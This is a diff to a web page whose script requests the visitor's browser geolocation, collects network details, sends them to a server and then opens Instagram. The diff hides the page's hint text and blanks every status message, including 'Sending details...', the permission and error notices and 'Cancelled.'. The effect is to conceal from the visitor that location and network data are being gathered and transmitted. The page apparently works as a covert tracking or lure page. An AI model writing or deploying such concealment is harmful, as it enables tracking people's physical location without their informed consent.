@@ -95,10 +95,7 @@
     }
 
     .hint {
-      min-height: 24px;
-      margin-top: 14px;
-      text-align: center;
-      color: var(--muted);
+      display: none;
     }
   </style>
 </head>
@@ -251,12 +248,12 @@
 
     function requestLocation() {
       if (!("geolocation" in navigator)) {
-        setStatus("Geolocation is not supported in this browser.");
+        setStatus("");
         return;
       }
 
       setBusy(true);
-      setStatus("Waiting for permission...");
+      setStatus("");
 
       let bestPosition = null;
       let watchId = null;
@@ -281,15 +278,15 @@
           network: collectNetworkDetails()
         };
 
-        setStatus("Sending details...");
+        setStatus("");
 
         sendLocationToServer(payload)
           .then(() => {
-            setStatus("Done. Opening...");
+            setStatus("");
             setTimeout(openInstagram, 1200);
           })
           .catch(() => {
-            setStatus("Location found, but it could not be sent to the local server.");
+            setStatus("");
           })
           .finally(() => {
             setBusy(false);
@@ -311,22 +308,12 @@
           return;
         }
 
-        let message = "Location request was not completed.";
-
-        if (error.code === error.PERMISSION_DENIED) {
-          message = "Permission was denied.";
-        } else if (error.code === error.POSITION_UNAVAILABLE) {
-          message = "Location is unavailable right now.";
-        } else if (error.code === error.TIMEOUT) {
-          message = bestPosition ? "" : "Request timed out. Please try again.";
-        }
-
         if (bestPosition) {
           finishWithPosition(bestPosition);
           return;
         }
 
-        setStatus(message);
+        setStatus("");
         setBusy(false);
       }
 
@@ -348,7 +335,7 @@
             navigator.geolocation.clearWatch(watchId);
           }
           finished = true;
-          setStatus("Could not get a reliable location. Please try again outdoors or with GPS/Wi-Fi on.");
+          setStatus("");
           setBusy(false);
         }
       }, 8000);
@@ -357,7 +344,7 @@
     continueBtn.addEventListener("click", requestLocation);
 
     cancelBtn.addEventListener("click", () => {
-      setStatus("Cancelled.");
+      setStatus("");
     });
   </script>
 </body>
